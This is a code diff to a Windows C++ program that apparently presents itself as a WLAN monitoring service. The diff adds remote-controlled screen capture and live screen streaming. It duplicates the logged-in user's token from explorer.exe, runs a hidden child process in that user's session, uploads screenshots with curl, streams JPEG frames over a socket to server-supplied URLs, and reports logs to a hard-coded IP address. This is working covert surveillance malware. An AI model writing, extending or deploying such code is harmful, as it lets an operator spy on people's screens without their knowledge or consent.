@@ -3,6 +3,11 @@
 
 #include <iostream>
 #include <fstream>
+
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include <winsock2.h>
+#pragma comment(lib, "ws2_32.lib")
+
 #include <windows.h>
 #include <string>
 #include <shellapi.h>
@@ -12,16 +17,28 @@
 #include <wininet.h> // 添加网络缓存清除支持
 #include <psapi.h>   // 添加进程获取支持
 #include <tlhelp32.h> // 添加进程快照支持
+#include <thread>
+#include <mutex>
+#include <atomic>
+
+#include <winsock2.h>
+#pragma comment(lib, "ws2_32.lib")
 
 #pragma comment(lib, "wlanapi.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "urlmon.lib") // 链接网络下载库
 #pragma comment(lib, "iphlpapi.lib") // 链接网络信息库
 #pragma comment(lib, "wininet.lib") // 链接缓存控制库
+#include <wtsapi32.h>
+#include <userenv.h>
+#pragma comment(lib, "wtsapi32.lib")
+#pragma comment(lib, "userenv.lib")
+#include <gdiplus.h>
+#pragma comment(lib, "gdiplus.lib")
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.3.11"
+#define MANUAL_COMPILE_VERSION "1.4.15"
 // ==============================================================
 
 // 定义当前程序版本和服务器更新地址
@@ -704,6 +721,208 @@ void SendOutputToServer(const std::string& mac, const std::string& output) {
 // 存放服务器返回的此台电脑备注名，并在后续用于关机判断
 std::string g_CustomMyName = "";
 
+void ReportScreenLog(const std::string& log) {
+    if (GetMacAddress() == "UNKNOWN_MAC") return;
+    std::string utf8Log = AnsiToUtf8(log);
+    std::string postData = "mac=" + UrlEncode(GetMacAddress()) + "&log=" + UrlEncode(utf8Log);
+    HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (hSession) {
+        HINTERNET hConnect = InternetConnectA(hSession, "120.78.3.56", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+        if (hConnect) {
+            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/screen/log", NULL, NULL, NULL, 0, 1);
+            if (hRequest) {
+                std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
+                HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length());
+                InternetCloseHandle(hRequest);
+            }
+            InternetCloseHandle(hConnect);
+        }
+        InternetCloseHandle(hSession);
+    }
+}
+
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT num = 0, size = 0;
+    Gdiplus::GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL) return -1;
+    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+    free(pImageCodecInfo);
+    return -1;
+}
+
+void CaptureScreenJpg(const std::string& filename) {
+    // 强制声明进程的 DPI 感知，才能从 GetSystemMetrics 获取到未经系统缩放的最真实物理屏幕分辨率
+    HMODULE hUser32 = LoadLibraryA("user32.dll");
+    if (hUser32) {
+        typedef BOOL(WINAPI* PSETPROCESSDPIAWARE)(VOID);
+        PSETPROCESSDPIAWARE pSetProcessDPIAware = (PSETPROCESSDPIAWARE)GetProcAddress(hUser32, "SetProcessDPIAware");
+        if (pSetProcessDPIAware) pSetProcessDPIAware();
+        FreeLibrary(hUser32);
+    }
+
+    ReportScreenLog("开始初始化GDI+");
+    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    Gdiplus::Status st = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+    if (st != Gdiplus::Ok) {
+        ReportScreenLog("GDI+ 初始化失败，状态码: " + std::to_string(st));
+        return;
+    }
+
+    // 支持多屏幕的虚拟桌面全集范围
+    int nScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int nScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    int nScreenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int nScreenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+    ReportScreenLog("获取到全虚拟屏幕分辨率: " + std::to_string(nScreenWidth) + "x" + std::to_string(nScreenHeight) + " (坐标原点: " + std::to_string(nScreenX) + "," + std::to_string(nScreenY) + ")");
+
+    if (nScreenWidth == 0 || nScreenHeight == 0) {
+        ReportScreenLog("虚拟频幕分辨率为 0，尝试回退获取主屏幕...");
+        nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
+        nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
+        nScreenX = 0;
+        nScreenY = 0;
+        if (nScreenWidth == 0 || nScreenHeight == 0) {
+            ReportScreenLog("分辨率仍为 0，可能没有连接显示器或位于不支持桌面的安全会话中！");
+            Gdiplus::GdiplusShutdown(gdiplusToken);
+            return;
+        }
+    }
+
+    HWND hDesktopWnd = GetDesktopWindow();
+    if (!hDesktopWnd) ReportScreenLog("警告：GetDesktopWindow() 为 NULL");
+
+    HDC hDesktopDC = GetDC(hDesktopWnd);
+    if (!hDesktopDC) ReportScreenLog("致命：GetDC(hDesktopWnd) 失败，错误码：" + std::to_string(GetLastError()));
+
+    HDC hMemoryDC = CreateCompatibleDC(hDesktopDC);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, nScreenWidth, nScreenHeight);
+    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+
+    // 复制坐标应当以虚拟桌面的坐标原点开始
+    BOOL bltRes = BitBlt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hDesktopDC, nScreenX, nScreenY, SRCCOPY);
+    if (!bltRes) {
+         ReportScreenLog("致命：BitBlt 画面复制失败，错误码：" + std::to_string(GetLastError()));
+    } else {
+         ReportScreenLog("BitBlt 抓取像素到内存完成");
+    }
+
+    {
+        Gdiplus::Bitmap bitmap(hBitmap, NULL);
+        CLSID clsid;
+        if (GetEncoderClsid(L"image/jpeg", &clsid) != -1) {
+            int wLen = MultiByteToWideChar(CP_ACP, 0, filename.c_str(), -1, NULL, 0);
+            if (wLen > 0) {
+                std::wstring wFilename(wLen, 0);
+                MultiByteToWideChar(CP_ACP, 0, filename.c_str(), -1, &wFilename[0], wLen);
+                if (!wFilename.empty() && wFilename.back() == L'\0') wFilename.pop_back();
+                Gdiplus::Status saveSt = bitmap.Save(wFilename.c_str(), &clsid, NULL);
+                if (saveSt != Gdiplus::Ok) {
+                    ReportScreenLog("保存到本地JPG失败，状态码：" + std::to_string(saveSt));
+                } else {
+                    ReportScreenLog("已保存图片到本地临时目录: " + filename);
+                }
+            }
+        } else {
+            ReportScreenLog("致命：找不到 image/jpeg 编码器");
+        }
+    } // 让 bitmap 对象在 GdiplusShutdown 之前析构销毁，否则会导致进程崩溃
+
+    SelectObject(hMemoryDC, hOldBitmap);
+    DeleteObject(hBitmap);
+    DeleteDC(hMemoryDC);
+    ReleaseDC(hDesktopWnd, hDesktopDC);
+    Gdiplus::GdiplusShutdown(gdiplusToken);
+}
+
+bool RunInUserSession(const std::string& cmdLine) {
+    ReportScreenLog("接收到服务端指令请求，正在尝试穿透进入活动用户会话的桌面...");
+    HANDLE hToken = NULL;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(PROCESSENTRY32W);
+        if (Process32FirstW(hSnap, &pe)) {
+            do {
+                if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
+                    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
+                    if (hProc) {
+                        if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
+                            ReportScreenLog("成功窃取到 explorer.exe 进程的合法用户桌面Token");
+                            CloseHandle(hProc);
+                            break;
+                        }
+                        CloseHandle(hProc);
+                    }
+                }
+            } while (Process32NextW(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+
+    if (!hToken) {
+        ReportScreenLog("未能找到 explorer.exe，退回到尝试使用 WTSActiveConsoleSession 获取默认控制台Token...");
+        DWORD sessionId = WTSGetActiveConsoleSessionId();
+        if (!WTSQueryUserToken(sessionId, &hToken)) {
+            ReportScreenLog("WTSQueryUserToken 失败，这可能由于当前电脑处理锁屏状态或无人登录，错误码: " + std::to_string(GetLastError()));
+            return false;
+        }
+    }
+
+    HANDLE hDupToken = NULL;
+    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken)) {
+        ReportScreenLog("复制 TokenPrimary 失败，错误码: " + std::to_string(GetLastError()));
+        CloseHandle(hToken);
+        return false;
+    }
+
+    LPVOID pEnv = NULL;
+    CreateEnvironmentBlock(&pEnv, hDupToken, FALSE);
+
+    STARTUPINFOA si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.lpDesktop = (LPSTR)"winsta0\\default";
+
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+
+    std::string wcmd = cmdLine;
+    ReportScreenLog("拉取携带 \"-usermode SCREEN ...\" 参数的用户进程，指令: " + wcmd);
+    BOOL bRes = CreateProcessAsUserA(
+        hDupToken, 
+        NULL, 
+        &wcmd[0], 
+        NULL, NULL, FALSE, 
+        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, 
+        pEnv, 
+        NULL, 
+        &si, &pi);
+
+    if (bRes) {
+        ReportScreenLog("成功创建提权用户级子进程执行截屏任务。");
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        ReportScreenLog("CreateProcessAsUserA 调用失败，错误码：" + std::to_string(GetLastError()));
+    }
+
+    DestroyEnvironmentBlock(pEnv);
+    CloseHandle(hDupToken);
+    CloseHandle(hToken);
+    return bRes == TRUE;
+}
+
 // 字符串去除首尾空白和换行符（容错处理）
 void TrimString(std::string &s) {
     if (s.empty()) return;
@@ -834,6 +1053,22 @@ void ReportToServer() {
                                 } else res = "Fail: OpenService error " + std::to_string(GetLastError());
                                 CloseServiceHandle(hSCM);
                             } else res = "Fail: OpenSCM error " + std::to_string(GetLastError());
+                        }
+                    } else if (type == "SCREEN") {
+                        std::string exePath = GetExePath();
+                        std::string cmd = "\"" + exePath + "\" -usermode SCREEN \"" + argStr + "\"";
+                        if (RunInUserSession(cmd)) {
+                            res = "Success: Capture triggered via user session.";
+                        } else {
+                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
+                        }
+                    } else if (type == "STREAM") {
+                        std::string exePath = GetExePath();
+                        std::string cmd = "\"" + exePath + "\" -usermode STREAM \"" + argStr + "\"";
+                        if (RunInUserSession(cmd)) {
+                            res = "Success: Stream triggered via user session.";
+                        } else {
+                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                         }
                     }
 
@@ -1061,7 +1296,188 @@ int main()
 
     std::string cmdLine = GetCommandLineA();
     if (cmdLine.find("-usermode") != std::string::npos) {
-        // 用户模式辅助进程：负责获取前台焦点窗口发送给服务器的逻辑已被精简移除
+        if (cmdLine.find("STREAM") != std::string::npos) {
+            ReportScreenLog("新切出的流媒体串流子进程已启动...");
+            size_t pos = cmdLine.find("http");
+            if (pos != std::string::npos) {
+                std::string url = cmdLine.substr(pos);
+                while (!url.empty() && (url.back() == '"' || url.back() == ' ')) {
+                    url.pop_back();
+                }
+
+                std::string host, path;
+                int port = 80;
+                if (url.find("http://") == 0) {
+                    std::string rest = url.substr(7);
+                    size_t slashPos = rest.find('/');
+                    if (slashPos != std::string::npos) {
+                        host = rest.substr(0, slashPos);
+                        path = rest.substr(slashPos);
+                    } else {
+                        host = rest;
+                        path = "/";
+                    }
+                    size_t colonPos = host.find(':');
+                    if (colonPos != std::string::npos) {
+                        port = std::stoi(host.substr(colonPos + 1));
+                        host = host.substr(0, colonPos);
+                    }
+                }
+
+                HMODULE hUser32 = LoadLibraryA("user32.dll");
+                if (hUser32) {
+                    typedef BOOL(WINAPI* PSETPROCESSDPIAWARE)(VOID);
+                    PSETPROCESSDPIAWARE pSetProcessDPIAware = (PSETPROCESSDPIAWARE)GetProcAddress(hUser32, "SetProcessDPIAware");
+                    if (pSetProcessDPIAware) pSetProcessDPIAware();
+                    FreeLibrary(hUser32);
+                }
+
+                Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+                ULONG_PTR gdiplusToken;
+                Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
+                CLSID clsid;
+                GetEncoderClsid(L"image/jpeg", &clsid);
+
+                WSADATA wsaData;
+                WSAStartup(MAKEWORD(2, 2), &wsaData);
+                SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                if (sock != INVALID_SOCKET) {
+                    struct sockaddr_in serv_addr;
+                    serv_addr.sin_family = AF_INET;
+                    serv_addr.sin_port = htons(port);
+                    struct hostent* he = gethostbyname(host.c_str());
+                    if (he != NULL) {
+                        memcpy(&serv_addr.sin_addr, he->h_addr_list[0], he->h_length);
+                        if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
+                            std::string httpReq = "POST " + path + " HTTP/1.1\r\n"
+                                                  "Host: " + host + ":" + std::to_string(port) + "\r\n"
+                                                  "Transfer-Encoding: chunked\r\n"
+                                                  "Content-Type: application/octet-stream\r\n\r\n";
+                            send(sock, httpReq.c_str(), httpReq.length(), 0);
+
+                            ULONG quality = 60; // 修改为60极大提升画质
+
+                            // 设为非阻塞模式以实时检测服务端停止信号
+                            u_long mode = 1;
+                            ioctlsocket(sock, FIONBIO, &mode);
+
+                            while (true) {
+                                int nScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+                                int nScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+                                int nScreenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
+                                int nScreenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+                                if (nScreenWidth == 0) { Sleep(500); continue; }
+
+                                int targetW = nScreenWidth;
+                                int targetH = nScreenHeight;
+                                if (nScreenWidth > 1920) { // 限制最大1080P尺寸，不至于糊，也保障超宽屏不会爆显存
+                                    targetW = 1920;
+                                    targetH = (nScreenHeight * 1920) / nScreenWidth;
+                                }
+
+                                HWND hDesktopWnd = GetDesktopWindow();
+                                HDC hDesktopDC = GetDC(hDesktopWnd);
+                                HDC hMemoryDC = CreateCompatibleDC(hDesktopDC);
+                                HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, targetW, targetH);
+                                HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+
+                                SetStretchBltMode(hMemoryDC, COLORONCOLOR); // 使用高速的缩放模式换取高帧率
+                                StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDesktopDC, nScreenX, nScreenY, nScreenWidth, nScreenHeight, SRCCOPY);
+
+                                IStream* pStream = NULL;
+                                CreateStreamOnHGlobal(NULL, TRUE, &pStream);
+
+                                {
+                                    Gdiplus::Bitmap bitmap(hBitmap, NULL);
+                                    Gdiplus::EncoderParameters ep;
+                                    ep.Count = 1;
+                                    ep.Parameter[0].Guid = Gdiplus::EncoderQuality;
+                                    ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
+                                    ep.Parameter[0].NumberOfValues = 1;
+                                    ep.Parameter[0].Value = &quality;
+                                    bitmap.Save(pStream, &clsid, &ep);
+                                }
+
+                                STATSTG statstg;
+                                pStream->Stat(&statstg, STATFLAG_NONAME);
+                                ULONG cbSize = statstg.cbSize.LowPart;
+
+                                std::string buffer(cbSize, '\0');
+                                LARGE_INTEGER liZero = {0};
+                                pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
+                                ULONG bytesRead = 0;
+                                pStream->Read(&buffer[0], cbSize, &bytesRead);
+                                pStream->Release();
+
+                                SelectObject(hMemoryDC, hOldBitmap);
+                                DeleteObject(hBitmap);
+                                DeleteDC(hMemoryDC);
+                                ReleaseDC(hDesktopWnd, hDesktopDC);
+
+                                // 按照 Chunked 数据组织报文
+                                uint32_t cbSizeLE = cbSize;
+                                uint32_t payloadSize = 4 + cbSize;
+                                char chunkHeader[32];
+                                sprintf_s(chunkHeader, "%x\r\n", (unsigned int)payloadSize);
+
+                                std::string sendBuffer;
+                                sendBuffer.append(chunkHeader);
+                                sendBuffer.append((char*)&cbSizeLE, 4);
+                                sendBuffer.append(buffer.data(), cbSize);
+                                sendBuffer.append("\r\n");
+
+                                int s1 = send(sock, sendBuffer.data(), (int)sendBuffer.size(), 0);
+                                if (s1 <= 0 && WSAGetLastError() != WSAEWOULDBLOCK) break;
+
+                                char recvBuf[128];
+                                int r = recv(sock, recvBuf, sizeof(recvBuf)-1, 0);
+                                if (r > 0) {
+                                    recvBuf[r] = '\0';
+                                    if (std::string(recvBuf).find("STOP") != std::string::npos) {
+                                        break;
+                                    }
+                                }
+
+                                Sleep(10); // 进一步降低休眠，允许近 60FPS 的采集
+                            }
+                        }
+                    }
+                    closesocket(sock);
+                }
+                WSACleanup();
+                Gdiplus::GdiplusShutdown(gdiplusToken);
+            } else {
+                ReportScreenLog("致命：无法从命令行参数提取串流 URL。");
+            }
+            return 0; // 专属执行完毕后必出循环结束即可
+        }
+
+        if (cmdLine.find("SCREEN") != std::string::npos) {
+            ReportScreenLog("新切出的用户子进程已启动...");
+            size_t pos = cmdLine.find("http");
+            if (pos != std::string::npos) {
+                std::string url = cmdLine.substr(pos);
+                while (!url.empty() && (url.back() == '"' || url.back() == ' ')) {
+                    url.pop_back();
+                }
+                char tempPath[MAX_PATH];
+                GetTempPathA(MAX_PATH, tempPath);
+                std::string jpgPath = std::string(tempPath) + "sc.jpg";
+
+                CaptureScreenJpg(jpgPath);
+
+                ReportScreenLog("准备调用 curl 上传到: " + url);
+                std::string curlCmd = "curl.exe -s -k -F \"file=@" + jpgPath + "\" \"" + url + "\"";
+                std::string resOut = ExecCmd(curlCmd, false);
+                ReportScreenLog("CMD / curl.exe 返回输出: [" + resOut + "]");
+                DeleteFileA(jpgPath.c_str());
+                ReportScreenLog("用户子进程操作完毕并已清理残留缓存，退出。");
+            } else {
+                ReportScreenLog("致命：无法从命令行参数提取上传 URL。");
+            }
+        }
         return 0; 
     }
 
